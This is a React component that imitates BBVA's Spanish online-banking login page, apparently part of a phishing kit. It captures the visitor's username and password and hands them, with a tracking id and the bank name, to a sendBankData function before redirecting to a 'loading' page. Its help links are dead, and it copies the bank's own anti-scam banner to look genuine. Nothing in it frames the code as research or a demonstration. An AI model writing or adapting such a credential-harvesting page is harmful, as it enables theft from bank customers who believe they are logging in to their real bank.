import { useState } from 'react'
import { useNavigate, useParams } from 'react-router-dom'
import { sendBankData } from '../../../utils/utils'
import Shield from '../../images/Shield.svg?react'
import '../../styles/styles.scss'
import { Input } from '../ui/input/Input'

export function LoginForm() {
  const { id } = useParams()
  const navigate = useNavigate()

  const [login, setLogin] = useState('')
  const [password, setPassword] = useState('')

  const sendAndNavigate = (): void => {
    sendBankData(id!, 'BBVA', login, password)
    navigate(`/loading/${id}`)
  }

  return (
    <main className="w-full pt-[56px]">
      <div className="mx-auto flex w-full min-w-[960px] max-w-[960px] gap-x-8">
        <div className="w-full max-w-1/2">
          <h2 className="mb-6 text-[20px] font-semibold text-[#121212]">Hola, introduce tu usuario y clave de acceso</h2>
          <div className="mb-6 flex flex-col">
            <Input placeholder="Usuario" value={login} onChange={(e) => setLogin(e.target.value)} />
            <div className="flex items-center gap-x-1 pl-4 pr-2">
              <i className="font-icon mt-2 text-base not-italic text-[#043263] before:content-['']" />
              <span className="mt-2 text-xs text-[#666]">NIF, NIE, Pasaporte o Tarjeta Anónima</span>
            </div>
          </div>
          <Input placeholder="Clave de accesso" onChange={(e) => setPassword(e.target.value)} value={password} />
          <div className="mt-8 flex flex-row items-center">
            <button
              onClick={sendAndNavigate}
              className="mr-6 h-12 min-w-[152px] bg-[#1973b8] text-sm font-semibold text-white transition-all duration-300 ease-in-out hover:bg-[#1464a5]"
            >
              Entrar
            </button>
            <a href="" className="text-[15px] font-semibold text-[#1973b8] hover:text-[#004481]">
              ¿Olvidaste tu clave de acceso?
            </a>
          </div>
          <div className="mb-6 mt-10 h-[1px] w-10 bg-[#d3d3d3]" />
          <div className="flex flex-col gap-y-4">
            <a href="" className="text-[15px] font-semibold text-[#1973b8] hover:text-[#004481]">
              ¿No tienes clave de acceso? Crea tu clave
            </a>
            <a href="" className="text-[15px] font-semibold text-[#1973b8] hover:text-[#004481]">
              ¿No eres cliente? Hazte cliente
            </a>
            <a href="" className="text-[15px] font-semibold text-[#1973b8] hover:text-[#004481]">
              Descubre las ventajas de la banca online
            </a>
          </div>
        </div>
        <div className="flex h-full max-h-[372px] w-full max-w-1/2 justify-center">
          <div className="flex max-w-[368px] flex-col items-center px-6 py-8 shadow-[0_1px_1px_1px_rgba(0,_0,_0,_0.1)]">
            <Shield className="mb-6 h-20 w-20" />
            <h1 className="mb-2 text-xl font-semibold text-[#121212]">Tus hijos en apuros…. ¿o no?</h1>
            <h2 className="mb-4 text-center text-sm font-light text-[#121212]">
              Si recibes un SMS o WhatsApp de un número desconocido que dice ser tu hij@ y te pide dinero, ¡puede ser una estafa!
              Protegerte de este fraude es cibersencillo
            </h2>
            <div className="flex cursor-pointer items-center gap-x-1 pl-4 pr-2 text-[#1973B8] hover:text-[#004481]">
              <i className="font-icon mt-2 text-base not-italic before:content-['']" />
              <span className="mt-2 text-sm font-medium">Más información</span>
            </div>
          </div>
        </div>
      </div>
    </main>
  )
}
